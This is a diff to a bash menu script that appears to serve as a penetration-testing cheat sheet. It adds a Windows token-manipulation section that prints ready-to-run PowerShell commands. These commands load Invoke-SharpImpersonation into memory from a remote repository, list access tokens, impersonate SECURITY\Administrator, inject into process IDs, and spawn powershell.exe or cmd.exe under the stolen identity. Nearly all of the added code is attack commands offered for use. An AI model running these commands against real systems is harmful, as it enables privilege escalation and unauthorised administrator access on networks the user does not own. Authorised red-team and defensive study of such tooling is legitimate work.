@@ -467,6 +467,7 @@ echo -ne " What would you like to do?
         6)  ->  [ Password Spraying 		]
         7)  ->  [ Privilege Escalation		]
         8)  ->  [ Recon 			]
+        9)  ->	[ Token Manipulation		]
         
         A)  ->	[ AMSI Bypasses			]
         E)  ->	[ Recent CVE's			]
@@ -483,6 +484,7 @@ echo -ne " What would you like to do?
 	        6) 	Internal_Menu_Password_Spraying ;;
 	        7) 	Internal_Menu_Privilege_Escalation ;;
 	        8) 	Internal_Menu_Recon ;;
+	        9)	Internal_Menu_Token ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 	        e|E)	Internal_Menu_CVEs ;;
 	        l|L)	Internal_Menu_Host_Local ;;
@@ -1207,6 +1209,79 @@ echo -ne " Select Recon Type
         esac
 }
 
+
+Internal_Menu_Token(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " Select Token Manipulation tool Type
+
+
+
+        1)  ->  [ Invoke-SharpImpersonation ${LYELLOW}WIP${RESTORE}]
+        2)  ->  [ Invoke-TokenManipulation  ${LYELLOW}WIP${RESTORE}]
+        
+        Q)  ->	[Previous Menu		]
+"
+        read a
+        case $a in
+	        1) 	Internal_Menu_Token_SharpImpersonation ;;
+	        2) 	Internal_Menu_Token_TokenManipulation ;;
+	        q|Q)	Internal_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
+Internal_Menu_Token_SharpImpersonation(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Invoke-SharpImpersonation${RESTORE}"
+echo -e ""
+echo -e "${YELLOW}Load into memory${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpImpersonationNoSpace.ps1)"
+echo -e ""
+echo -e "${IBLUE}List tokens on current system${RESTORE}"
+echo -e "Invoke-SharpImpersonation -Command "\"list\"""
+echo -e "Invoke-SharpImpersonation -Command "\"list wmi"\""
+echo -e ""
+echo -e "${IBLUE}Attempt to impersonate user with first process found${RESTORE}"
+echo -e "Invoke-SharpImpersonation -Command "\"user:SECURITY\\Administrator"\""
+echo -e ""
+echo -e "${IBLUE}Inject directly into a process ID${RESTORE}"
+echo -e "Invoke-SharpImpersonation -Command "\"pid:[PID]"\""
+echo -ne "Get-Process -IncludeUserName | Select UserName, ProcessName, ID | Sort UserName" ; echo -e " ${YELLOW}# List PIDs and Users with PowerShell${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Impersonate first process of target user to a custom binary path${RESTORE}"
+echo -ne "Invoke-SharpImpersonation -Command "\"user:SECURITY\\Administrator binary:powershell.exe"\"" ; echo -e " ${YELLOW}# Start PowerShell${RESTORE}"
+echo -ne "Invoke-SharpImpersonation -Command "\"user:SECURITY\\Administrator binary:cmd.exe"\"" ; echo -e " ${YELLOW}# Start CMD${RESTORE}"
+echo -e ""
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Token ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
 
 
 Internal_Menu_Recon_Local_Host(){
